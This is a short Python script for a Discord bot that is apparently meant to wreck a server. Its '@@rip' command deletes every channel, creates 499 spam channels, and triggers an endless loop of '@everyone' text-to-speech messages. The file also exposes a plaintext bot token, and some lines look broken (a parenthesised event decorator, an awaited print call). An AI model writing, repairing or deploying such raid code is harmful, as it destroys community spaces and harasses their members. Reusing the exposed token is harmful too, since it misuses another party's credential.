import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='@@') 

@bot.event()
async def on_ready():
    await print('>>ON READY<<')

@bot.command()
async def rip(ctx):
        for channel in ctx.guild.channels:
          await channel.delete()
        for i in range(1, 500):
            await ctx.guild.create_text_channel("SPAMMMMMMMM")

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone  R-OOKIE in coding", tts=True)

bot.run('NzY0Mzc5NTk3MzcwMjk0Mjcy.X4FZ-Q.m-ZNM-7upiyDxkLQKYxAQSAHabA')